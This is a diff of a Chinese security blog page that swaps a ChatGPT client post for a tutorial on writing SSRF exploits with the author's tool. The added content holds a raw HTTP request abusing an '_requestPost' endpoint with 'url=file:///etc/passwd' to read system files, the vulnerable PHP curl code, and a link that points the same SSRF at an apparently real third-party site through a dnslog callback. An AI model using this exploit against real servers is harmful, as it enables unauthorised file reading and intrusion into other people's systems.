@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ChatGpt使用和注册|ChatGpt-C#客户端, peiqiF4ck github">
-    <meta name="description" content="AI">
+    <meta name="keywords" content="使用我们的软件编写ssrf漏洞实战案例, peiqiF4ck github">
+    <meta name="description" content="webframeworktools 编写ssrf exp展示">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ChatGpt使用和注册|ChatGpt-C#客户端 | peiqiF4ck</title>
+    <title>使用我们的软件编写ssrf漏洞实战案例 | peiqiF4ck</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -278,12 +278,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302081326727.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261435940.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ChatGpt使用和注册|ChatGpt-C#客户端</h1>
+                    <h1 class="description center-align post-title">使用我们的软件编写ssrf漏洞实战案例</h1>
                 </div>
             </div>
         </div>
@@ -399,8 +399,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/AI/">
-                                <span class="chip bg-color">AI</span>
+                            <a href="/tags/PenetrationTestingExample/">
+                                <span class="chip bg-color">PenetrationTestingExample</span>
+                            </a>
+                        
+                            <a href="/tags/original/">
+                                <span class="chip bg-color">original</span>
                             </a>
                         
                     </div>
@@ -411,8 +415,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/ChatGpt/" class="post-category">
-                                ChatGpt
+                            <a href="/categories/SecurityTools/" class="post-category">
+                                SecurityTools
                             </a>
                         
                     </div>
@@ -424,28 +428,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-08
+                    2024-11-26
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-02-08
+                    2024-11-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    71
+                    838
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -468,13 +472,75 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ChatGpt注册"><a href="#ChatGpt注册" class="headerlink" title="ChatGpt注册"></a>ChatGpt注册</h1> <ul><li>参考文章:https://baijiahao.baidu.com/s?id=1757224229351914188&wfr=spider&for=pc</li></ul>
+                <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们在实战的时候遇到任意文件读取或者是ssrf漏洞来说任意文件读取漏洞那个如果有回显可以直接根据回显发送post get包就行了。如果没有回显那么我们如何编写这种漏洞的exp。例如:如下漏洞<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Cr1XIUkge36cGYtpHtw1Dw">https://mp.weixin.qq.com/s/Cr1XIUkge36cGYtpHtw1Dw</a><br>漏洞exp:</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh">GET &#x2F;api&#x2F;wxapps&#x2F;_requestPost?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&amp;data&#x3D;1 HTTP&#x2F;2
+Host: 127.0.0.1
+Sec-Ch-Ua: &quot;(Not(A:Brand&quot;;v&#x3D;&quot;8&quot;, &quot;Chromium&quot;;v&#x3D;&quot;101&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;101.0.4951.54 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Connection: close</code></pre>
 
-<h2 id="ChatGpt客户端使用"><a href="#ChatGpt客户端使用" class="headerlink" title="ChatGpt客户端使用"></a>ChatGpt客户端使用</h2>  <ul><li>注册好了然后去网站生成apikey然后打开软件的ChatGPTCS.exe.config 里面的value="你申请的key"</li></ul>
+<p>使用内置 curl_exec函数发送请求。漏洞原理</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//不带报头的curl</span>
+<span class="token keyword">public</span> 
+<span class="token keyword">function</span> 
+<span class="token function-definition function">_requestPost</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$ssl</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span>
   
-
-<h2 id="ChatGpt演示使用"><a href="#ChatGpt演示使用" class="headerlink" title="ChatGpt演示使用"></a>ChatGpt演示使用</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302081326727.png" alt="ChatGpt演示"></p>
-<h2 id="ChatGpt下载"><a href="#ChatGpt下载" class="headerlink" title="ChatGpt下载"></a>ChatGpt下载</h2>  <ul><li>下载地址:https://t.me/SoftwareUpdateChannel/61</li></ul>
+<span class="token punctuation">&#123;</span>
+    
+<span class="token comment">//curl完成</span>
+    <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+<span class="token comment">//设置curl选项</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//URL</span>
+    <span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 FirePHP/0.7.4'</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_USERAGENT</span><span class="token punctuation">,</span> <span class="token variable">$user_agent</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//user_agent，请求代理信息</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_AUTOREFERER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//referer头，请求来源</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置超时时间</span>
+    
+<span class="token comment">//SSL相关</span>
+    
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ssl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//禁用后cURL将终止从服务端进行验证</span>
+      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检查服务器SSL证书中是否存在一个公用名(common name)。</span>
+    <span class="token punctuation">&#125;</span>
+    
+<span class="token comment">// 处理post相关选项</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 是否为POST请求</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 处理请求数据</span>
+    
+<span class="token comment">// 处理响应结果</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//是否处理响应头</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//curl_exec()是否返回响应结果</span>
+    
+<span class="token comment">// 发出请求</span>
+    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      
+<span class="token keyword">echo</span> 
+<span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">,</span> <span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
+      
+<span class="token keyword">return</span> 
+<span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+<span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span></code></pre>
+<p>我们随便找个网站看看exp就是<a target="_blank" rel="noopener" href="https://5319.newadco.com//api/wxapps/_requestPost?url=http://dnslog%E5%9C%B0%E5%9D%80/&amp;data=">https://5319.newadco.com//api/wxapps/_requestPost?url=http://dnslog地址/&amp;data=</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261421596.png" alt="实战"><br>是不是可以这么理解。那我们编写的时候直接这么编写不就行了。我们看nuclei ssrf编写案例<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Z4IFUVFjhWHYtAUCxz50LQ">https://mp.weixin.qq.com/s/Z4IFUVFjhWHYtAUCxz50LQ</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261426697.png" alt="ssrf编写"><br>如果我们利用python或者自己写一个程序来实现ssrf那将会是很麻烦所以我们来介绍我们工具编写ssrf步骤。</p>
+<h2 id="工具编写ssrf漏洞代码展示"><a href="#工具编写ssrf漏洞代码展示" class="headerlink" title="工具编写ssrf漏洞代码展示"></a>工具编写ssrf漏洞代码展示</h2><p>使用我们的工具编写ssrf漏洞只需简单的按规则发送请求即可。注意:<br>其中<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">www.dnslog.cn</a> 只能国内ip使用。<br/>这个只能国外地址使用 <a target="_blank" rel="noopener" href="https://dnslog.org/">https://dnslog.org</a><br/><br><a target="_blank" rel="noopener" href="https://oast.pro/">https://oast.pro/</a> 这个国内外ip都可以使用也就是nuclei使用的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261435940.png" alt="编写实例"><br>如果返回的是vul exist!!! 那么就存在漏洞并且结果exp已经写出来了。<br>怎么样我们使用三个dns平台测试ssrf漏洞当然实战建议选择后面两个因为dnslog只能国内ip使用。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在觉得编写exp poc很难么。还觉得难的话那是没有遇到我们的软件。后续源码小范围分享的时候会在内部辅导教学编写exp。直到学会为止。前提是你得会渗透测试能看懂http报文。和会简单的编程最好是C#编写。今天就讲到这里吧。</p>
 
                 
             </div>
@@ -501,7 +567,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://peiqiF4ck.github.io/chatgpt/2023/02/articles/5f434729a12aeff4/">https://peiqiF4ck.github.io/chatgpt/2023/02/articles/5f434729a12aeff4/</a>
+                    <a href="https://peiqiF4ck.github.io/securitytools/2024/11/articles/2a9c16adbff1ef3f/">https://peiqiF4ck.github.io/securitytools/2024/11/articles/2a9c16adbff1ef3f/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -539,8 +605,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/AI/">
-                                    <span class="chip bg-color">AI</span>
+                                <a href="/tags/PenetrationTestingExample/">
+                                    <span class="chip bg-color">PenetrationTestingExample</span>
+                                </a>
+                            
+                                <a href="/tags/original/">
+                                    <span class="chip bg-color">original</span>
                                 </a>
                             
                         </div>
@@ -714,49 +784,51 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/androidreverse/2023/02/articles/ab0a8d0cab6627b4/">
+                <a href="/securitytools/2024/11/articles/2a9c16adbff1ef3f/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261952214.png" class="responsive-img" alt="app渗透测试请求包加密如何进行自动化测试">
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261435940.png" class="responsive-img" alt="使用我们的软件编写ssrf漏洞实战案例">
                         
-                        <span class="card-title">app渗透测试请求包加密如何进行自动化测试</span>
+                        <span class="card-title">使用我们的软件编写ssrf漏洞实战案例</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            app请求加密的渗透测试
+                            webframeworktools 编写ssrf exp展示
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/AndroidReverse/" class="post-category">
-                                    AndroidReverse
+                            <a href="/categories/SecurityTools/" class="post-category">
+                                    SecurityTools
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Frida/">
-                        <span class="chip bg-color">Frida</span>
+                    <a href="/tags/PenetrationTestingExample/">
+                        <span class="chip bg-color">PenetrationTestingExample</span>
                     </a>
                     
-                    <a href="/tags/PenetrationTest/">
-                        <span class="chip bg-color">PenetrationTest</span>
+                    <a href="/tags/original/">
+                        <span class="chip bg-color">original</span>
                     </a>
                     
                 </div>
@@ -770,30 +842,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/0day/2023/02/articles/51b7e07325d69b2b/">
+                <a href="/penetrationtest/2024/11/articles/cbd79839949e8ffc/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061659904.png" class="responsive-img" alt="北京勤云期刊0day漏洞-可shell">
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251639460.png" class="responsive-img" alt="某诈骗平台渗透测试到代码审计前台getshell历程">
                         
-                        <span class="card-title">北京勤云期刊0day漏洞-可shell</span>
+                        <span class="card-title">某诈骗平台渗透测试到代码审计前台getshell历程</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            北京勤云期刊0day漏洞,期刊类漏洞
+                            主要是渗透测试代码审计提一嘴因为这套系统诈骗后续用的应该比较多不能公开审计过程
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-25
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/0day/" class="post-category">
-                                    0day
+                            <a href="/categories/PenetrationTest/" class="post-category">
+                                    PenetrationTest
                                 </a>
                             
                             
@@ -803,12 +875,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/original/">
-                        <span class="chip bg-color">original</span>
+                    <a href="/tags/PenetrationTestingExample/">
+                        <span class="chip bg-color">PenetrationTestingExample</span>
                     </a>
                     
-                    <a href="/tags/0day/">
-                        <span class="chip bg-color">0day</span>
+                    <a href="/tags/CodeAuditExample/">
+                        <span class="chip bg-color">CodeAuditExample</span>
                     </a>
                     
                 </div>
